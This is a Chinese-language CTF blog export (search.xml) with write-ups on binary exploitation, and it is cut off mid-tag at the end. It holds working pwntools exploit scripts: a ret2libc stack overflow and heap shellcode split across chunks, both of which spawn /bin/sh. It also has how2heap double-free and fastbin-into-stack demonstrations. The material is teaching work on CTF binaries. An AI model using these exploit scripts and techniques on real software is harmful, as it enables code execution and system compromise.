<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>栈溢出的总结</title>
      <link href="/2020/02/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2020/02/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>已经好久没有做过栈方面的的题目了，虽然现在比赛中有关栈的题目已经越来越少了，但是这方面的功夫还是不应该落下，就乘着这<br>这段时间把有关栈方面的知识都好好总结一下，省的到了比赛的时候碰到了又是手忙脚乱的。</p><a id="more"></a><h2 id="简单的ret2libc"><a href="#简单的ret2libc" class="headerlink" title="简单的ret2libc"></a>简单的ret2libc</h2><p>一般来说，没有pie保护和canary的程序，都是可以通过ret2libc这种通用的解题思路来进行处理的，方法就是利用栈溢出的漏洞来<br>进行一些信息的泄露，比如函数的真实地址，然后通过计算得到libc的基址，之后所有的问题就都可以迎刃而解了。当我们并不清楚<br>这个程序的libc版本时，则可以利用python的LibcSearcher这个库来直接得到我们泄露出来的函数再libc中的offset。这种方法是<br>我在做栈方面的题目是所使用的一种比较通用的方法，思路也是比较清晰的。</p><p>下面我们通过攻防世界中的pwn-100这道题来进行一个简单的分析</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/1.jpg" alt="avatar"></p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/2.jpg" alt="avatar"></p><p>这里通过简单的分析发现这个程序有一个十分明显的栈溢出漏洞，并且在输入完0xc8个字节后才会停止输入。这个栈溢出漏洞就能够帮助我们</p><p>然后还需要的辅助工作就是利用ROPgadgets来获取我们所需要的gadgets</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/3.jpg" alt="avatar"></p><p>这里我们需要的就是pop rdi  ret这个gadgets，这样当我们压入我们需要的数据之后，只要通过这个gadgets就可以让rdi的值<br>变成我们需要的值</p><p>接下来通过这个漏洞泄露出puts函数的真实地址，然后布置一个虚假的返回地址使其重新返回到main函数，进行第二次利用。<br>利用LibcSearcher就可以得到libc版本信息以及所有的offset，再次进行栈溢出就可以getshell</p><p>给出exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher </span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">main = 0x4006b8</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">payload =  &apos;a&apos;*0x40 +&apos;b&apos;*8 +p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">payload = payload.ljust(0xc8,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base + obj.dump(&apos;system&apos;)</span><br><span class="line">binsh = libc_base + obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload2 = &apos;a&apos;*0x47+p64(pop_rdi)+p64(binsh)+p64(system)+p64(0xdeadbeef) #0x47是因为复用后栈上会有一个字节坏掉</span><br><span class="line">payload2 = payload2.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里遇到的一个问题就是当我们进行了第一次泄露之后，当返回main函数后，不知道为什么栈上会坏掉一个字节，这点还需要后期的<br>调试来进行分析，就以后再进行解释。而且我发现别的做题者在使用和我基本相同的方式时栈就不会出现问题，真的把我的头都要气<br>掉了！！！！！！淦！！！！</p><p>ps：经过调试后发现只要在送第一个payload的时候使用send而不是sendline，返回后的栈就不会坏掉，具体原因还需要进一步的<br>学习</p><p>本道题还有一个不使用LibcSearcher库的解题思路，那就是利用DynELF和ret2csu这个通用gadgets，这样的话题目会变得比较复杂<br>这个通用gadgets的有关内容我会在下一篇文章中再进行介绍总结，本文就不细说了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2014 HITCON CTF-stkof</title>
      <link href="/2020/02/05/2014-HITCON-CTF-stkof/"/>
      <url>/2020/02/05/2014-HITCON-CTF-stkof/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN之note-service2</title>
      <link href="/2020/01/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E4%B9%8Bnote-service2/"/>
      <url>/2020/01/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E4%B9%8Bnote-service2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是攻防世界上的一道算是一道堆方向的题目，但是主要考验的是我们对shellcode的编写以及对fastbin机制的了解，考验用这道题<br>来正式入门堆方面的题目。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先通过checksec分析发现，程序是一个64位程序，开启了canary和pie，但是并没有开NX保护，这就为我们在堆中写入shellcode<br>提供了便利<br>然后使用ida简单分析一下程序，发现只实现了添加和删除功能<br><img src="/img/services2/1.jpg" alt="avatar"><br>分析了添加之后，发现两个问题<br>1:最多创建大小为8字节的堆<br>2:保存堆指针的数组存在下标越界</p><p>既然存在下标越界的问题，我们就可以把任意地方的8字节数据改写成堆的地址指针。即我们可以利用数组越界，把一些函数的GOT表<br>地址修改为堆指针。这就需要我们在堆上来布置shellcode了。</p><p>但是由于我们程序限制了每一个堆的大小最多为8个字节，且最多保存下7字节的数据<br><img src="/img/services2/2.jpg" alt="avatar"><br>但我们的shellcode最少也需要十几字节，这就需要我们将自己的shellcode分别创建在几个堆中，然后利用jmp short xxx指令，<br>来让他跳到下一个堆中去执行<br>这里经过查阅资料发现，jmp short xxx指令一共占两个字节，且使用的是相对当前代码位置寻址，且计算公式为<br><strong>xxx = 目标地址 - 当前地址 - 2</strong></p><p>由此我们来分析一下堆的数据结构，由于程序在64位环境下运行，所以堆的pre_size和size域分别占8个字节，堆的数据域占8个<br>字节，且64位环境下堆的大小应该与32对齐，由此，应该还存在8字节的空数据。<br>即xxx = 8+8+8+2+1-2 = 0x19</p><p>接下来就开始构造shellcode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:64位系统调用</span><br><span class="line">2.mov rdi,&apos;/bin/sh&apos;</span><br><span class="line">3.mov rax,59;execve的调用号</span><br><span class="line">4.mov rsi,0</span><br><span class="line">5.mov rdx,0</span><br><span class="line">6.syscall</span><br></pre></td></tr></table></figure><p>关键就在修改rdi上<br><img src="/img/services2/3.jpg" alt="avatar"><br>我们只需要将atoi的got表修改为指向第一个堆空间，但是这一步应该放在最后，因为修改之后atoi函数就无法使用了，由此<br>写出本题的脚本。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;,log_level=&apos;debug&apos;)</span><br><span class="line">def create(index,size,content):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line">p.sendlineafter(&apos;size:&apos;,str(size))</span><br><span class="line">p.sendafter(&apos;content:&apos;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code0 = asm(&apos;xor rax,rax&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code1 = asm(&apos;mov eax,0x3b&apos;)+&apos;\xeb\x19&apos;</span><br><span class="line">code2 = asm(&apos;xor rsi,rsi&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code3 = asm(&apos;xor rdx,rdx&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code4 = asm(&apos;syscall&apos;).ljust(7,&apos;\x90&apos;)</span><br><span class="line"></span><br><span class="line">#print len(code0)</span><br><span class="line">#print len(code1)</span><br><span class="line">#print len(code2)</span><br><span class="line">#print len(code3)</span><br><span class="line"></span><br><span class="line">create(0,8,&apos;a&apos;*7)</span><br><span class="line">create(1,8,code1)</span><br><span class="line">create(2,8,code2)</span><br><span class="line">create(3,8,code3)</span><br><span class="line">create(4,8,code4)</span><br><span class="line"></span><br><span class="line">delete(0)   /利用fastbin的特性，对堆进行再次利用</span><br><span class="line"></span><br><span class="line">create(-8,8,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本题是一道比较基础的堆利用加上shellcode编写的题目，使我对堆的理解以及shellcode编写有了更深一层的认识。希望以后能好好<br>打几场比赛。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hoe2heap学习笔记(1)——fastbin_dup</title>
      <link href="/2019/12/02/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94fastbin-dup/"/>
      <url>/2019/12/02/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94fastbin-dup/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台<br> 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且<br> 主要针对 glibc2.25和glibc2.26。</p><a id="more"></a><h2 id="fastbin-dup-fit"><a href="#fastbin-dup-fit" class="headerlink" title="fastbin_dup_fit"></a>fastbin_dup_fit</h2><p>这个程序不演示攻击，但是向我们演示了glibc的分配机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.\n&quot;);</span><br><span class="line">char* a = malloc(0x512);</span><br><span class="line">char* b = malloc(0x256);</span><br><span class="line">char* c;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(0x512): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(0x256): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;we could continue mallocing here...\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;now let&apos;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;);</span><br><span class="line">strcpy(a, &quot;this is A!&quot;);</span><br><span class="line">fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, let&apos;s allocate 0x500 bytes\n&quot;);</span><br><span class="line">c = malloc(506);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(0x500): %p\n&quot;, c);</span><br><span class="line">fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;);</span><br><span class="line">strcpy(c, &quot;this is C!&quot;);</span><br><span class="line">fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);</span><br><span class="line">fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line">fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc使用first-fit算法选择空闲块，如果一个块是空闲的并且足够大，malloc将选择这个块。<br>程序运行如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./first_fit</span><br><span class="line">This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.</span><br><span class="line">1st malloc(0x512): 0x1131010</span><br><span class="line">2nd malloc(0x256): 0x1131530</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let&apos;s put a string at a that we can read later &quot;this is A!&quot;</span><br><span class="line">first allocation 0x1131010 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x1131010</span><br><span class="line">So, let&apos;s allocate 0x500 bytes</span><br><span class="line">3rd malloc(0x500): 0x1131010</span><br><span class="line">And put a different string here, &quot;this is C!&quot;</span><br><span class="line">3rd allocation 0x1131010 points to this is C!</span><br><span class="line">first allocation 0x1131010 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure><p>这里向我们展示了glibc是如何申请一个空间，在free以后又是如何重新申请的</p><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>本程序是一个简单的double_free攻击展示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\n&quot;, a, b, a, a);</span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序运行后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup</span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xa11010 again, things will crash because 0xa11010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0xa11030.</span><br><span class="line">Now, we can free 0xa11010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0xa11010, 0xa11030, 0xa11010 ]. If we malloc 3 times, we&apos;ll get 0xa11010 twice!</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11010</span><br></pre></td></tr></table></figure><p>这里我们可以看到，我们首先申请三个空间，释放第一个空间a，这样fastbin就指向a。而fastbin是一个单向链表，每次进行free<br>操作时都会对free list进行检查，所以进行第一次释放后，我们不能直接对a再次进行释放操作。但是当我们把b也释放之后，free<br>list更新成了:0xa11030-&gt;0xa11010,这样就可以成功绕过检查，并且执行double_free。这时候free list被更新成：0xa11010-&gt;<br>0xa11030-&gt;0xa11010。之后我们就可以malloc三次，就在同一个地址malloc了两次，得到了两个指向了同一个地址的指针</p><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>这个程序是对fastbin_dup的延伸，通过double修改fd指针，构造一个fake_chunk，以达到任意地址读写的目的。<br>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序后，显示如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffc2e12fc28.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">3rd malloc(8): 0x2079050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x2079010 again, things will crash because 0x2079010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x2079030.</span><br><span class="line">Now, we can free 0x2079010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x2079010, 0x2079030, 0x2079010 ]. We&apos;ll now carry out our attack by modifying data at 0x2079010.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">Now the free list has [ 0x2079010 ].</span><br><span class="line">Now, we have access to 0x2079010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x2079010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x2079010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffc2e12fc28</span><br></pre></td></tr></table></figure><p>之前的步骤都和上一个例子差不多，经过一次double_free后，fastbin里的单链表结构为：0x2079010-&gt;0x2079030-&gt;0x2079010<br>之后我们进行两次malloc，fastbin表头重新变为0x2079010。这时，我们就可以一直申请0x2079010这个地址了。这样我们就可以来<br>构造fake_chunk。<br>程序中，d申请的是chunk_A的地址，而fastbin_list中的地址也是0x2079010。<br>之后就是攻击中最关键的一步了。取satck_var-8的地址，写入d的fd中，这样就伪造了一个fake_chunk<br>而这样，当程序再次进行malloc时，就会认为这里有一个free_chunk并且同意返回一个指向这个栈地址的指针。而如果我们对内存的<br>读写权限，就可以进行对内存的任意地址读写。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" 